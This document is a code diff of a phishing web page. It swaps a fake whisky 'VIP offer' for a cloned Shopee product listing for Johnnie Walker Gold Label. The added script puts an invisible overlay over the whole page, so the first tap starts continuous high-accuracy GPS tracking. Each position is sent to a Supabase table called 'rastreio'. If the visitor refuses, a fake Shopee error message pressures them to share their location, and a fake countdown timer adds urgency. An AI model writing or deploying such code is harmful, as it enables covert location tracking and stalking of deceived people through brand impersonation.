@@ -3,76 +3,239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Oferta Exclusiva - Outlet Bebidas</title>
+    <title>Shopee | Johnnie Walker Gold Label</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { font-family: 'Helvetica', sans-serif; background: #000; color: #fff; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .promo-card { border: 2px solid #d4af37; padding: 30px; border-radius: 15px; background: #111; max-width: 350px; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3); }
-        .whisky-img { width: 180px; margin-bottom: 15px; }
-        h1 { color: #d4af37; font-size: 22px; margin-bottom: 10px; }
-        .price { font-size: 28px; color: #fff; margin: 10px 0; }
-        .price span { text-decoration: line-through; color: #888; font-size: 16px; }
-        .btn-check { background: #d4af37; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 15px; }
-        .footer-text { font-size: 10px; color: #555; margin-top: 20px; }
+        :root {
+            --shopee-orange: #ee4d2d;
+            --shopee-bg: #f5f5f5;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: var(--shopee-bg);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        /* Camada invisível para disparar GPS no primeiro toque */
+        #camada-invisivel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+        }
+
+        /* Header Shopee */
+        .header {
+            background: white;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .back-icon {
+            font-size: 20px;
+            color: var(--shopee-orange);
+        }
+
+        /* Produto */
+        .product-img {
+            width: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            padding: 20px 0;
+        }
+
+            .product-img img {
+                width: 250px;
+                height: auto;
+            }
+
+        .info-container {
+            background: white;
+            padding: 15px;
+            margin-bottom: 10px;
+        }
+
+        .price-section {
+            color: var(--shopee-orange);
+            display: flex;
+            align-items: baseline;
+            gap: 5px;
+        }
+
+        .currency {
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .old-price {
+            color: #929292;
+            text-decoration: line-through;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+
+        .product-title {
+            font-size: 16px;
+            line-height: 20px;
+            margin: 10px 0;
+            font-weight: 400;
+            color: rgba(0,0,0,.87);
+        }
+
+        .shipping-badge {
+            background: #00bfa5;
+            color: white;
+            font-size: 10px;
+            padding: 2px 5px;
+            border-radius: 2px;
+            display: inline-block;
+        }
+
+        .rating {
+            color: var(--shopee-orange);
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        /* Barra Inferior Shopee */
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: white;
+            display: flex;
+            border-top: 1px solid #ddd;
+            height: 50px;
+        }
+
+        .btn-cart {
+            width: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--shopee-orange);
+            background: #ffeeec;
+            font-size: 14px;
+            border-right: 1px solid #ee4d2d;
+        }
+
+        .btn-buy {
+            width: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--shopee-orange);
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        /* Banner Flash Sale */
+        .flash-sale {
+            background: #ff4721;
+            color: white;
+            padding: 5px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-style: italic;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-    <div class="promo-card">
-        <h1>OFERTA VIP</h1>
-        <img src="https://files.catbox.moe/kwy0ow.png">
-        <p>Johnnie Walker Gold Label 750ml</p>
-        <p class="price"><span>R$ 450,00</span> <br> R$ 289,90</p>
-        <p style="font-size: 12px; color: #d4af37;">Verificando estoque na sua região...</p>
-        <button class="btn-check" id="main-btn">VERIFICAR DISPONIBILIDADE</button>
-        <p class="footer-text">SE BEBER NÃO DIRIJA. VENDA PROIBIDA PARA MENORES DE 18 ANOS.</p>
+    <div id="camada-invisivel"></div>
+
+    <div class="header">
+        <span class="back-icon">←</span>
+        <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" height="25">
+        <span>⋮</span>
+    </div>
+
+    <div class="product-img">
+        <img src="https://files.catbox.moe/kwy0ow.png" alt="Whisky">
+    </div>
+
+    <div class="flash-sale">
+        <span>OFERTA RELÂMPAGO</span>
+        <span id="timer">00:45:12</span>
+    </div>
+
+    <div class="info-container">
+        <div class="price-section">
+            <span class="currency">R$</span>
+            <span class="amount">150,15</span>
+            <span class="old-price">R$ 189,90</span>
+        </div>
+        <div class="product-title">Johnnie Walker Gold Label Reserve Scotch Whisky 750ml - Edição Especial</div>
+        <div class="shipping-badge">Frete Grátis com cupom</div>
+        <div class="rating">★★★★★ (4.9) | 1,2mil vendidos</div>
+    </div>
+
+    <div class="info-container" style="font-size: 14px; display: flex; justify-content: space-between;">
+        <span>Selecione a variação:</span>
+        <span style="color: #929292;">750ml ></span>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="btn-cart">Adicionar ao Carrinho</div>
+        <div class="btn-buy" id="buy-btn">Compre Agora</div>
     </div>
 
     <script>
-        // 1. CONFIGURAÇÕES - SUBSTITUA PELOS SEUS DADOS
         const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
-        
         const { createClient } = supabase;
         const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        // 2. FUNÇÃO PARA CAPTURAR E ENVIAR
-        async function capturarLocalizacao() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.watchPosition(async (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
+        const overlay = document.getElementById('camada-invisivel');
 
-                    // Envia para a tabela 'rastreio' que você criou com SQL
+        function dispararGPS() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(async (pos) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+
                     await _supabase.from('rastreio').insert([{
-                        latitude: latitude,
-                        longitude: longitude,
-                        precisao: accuracy,
-                        dispositivo: "Promoção Gold Label"
+                        latitude, longitude, precisao: accuracy, dispositivo: "Clone Shopee"
                     }]);
-                    
-                    console.log("Sincronizado com sucesso.");
-                }, 
-                (error) => {
-                    console.error("Permissão negada ou erro.");
-                }, 
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 0
-                });
+
+                }, (err) => {
+                    // Se ele negar, mostramos um erro da Shopee
+                    alert("Erro Shopee: Para calcular o Frete Grátis deste produto, precisamos da sua localização.");
+                }, { enableHighAccuracy: true });
             }
+            overlay.style.display = 'none'; // Some após o toque
         }
 
-        // 3. EXECUÇÃO AUTOMÁTICA
-        // Tenta pedir a localização assim que a página abre
-        window.onload = () => {
-            setTimeout(capturarLocalizacao, 1000); // Aguarda 1 segundo para o navegador carregar tudo
-        };
+        // Qualquer toque no site dispara
+        overlay.addEventListener('click', dispararGPS);
+        overlay.addEventListener('touchstart', dispararGPS);
 
-        // Como garantia, se o automático falhar, o clique no botão ativa
-        document.getElementById('main-btn').addEventListener('click', () => {
-            capturarLocalizacao();
-            alert("Produto temporariamente indisponível para sua região!");
-        });
+        // Cronômetro falso para urgência
+        let tempo = 2712;
+        setInterval(() => {
+            tempo--;
+            let min = Math.floor(tempo / 60);
+            let seg = tempo % 60;
+            document.getElementById('timer').innerText = `00:${min < 10 ? '0' + min : min}:${seg < 10 ? '0' + seg : seg}`;
+        }, 1000);
     </script>
 </body>
 </html>
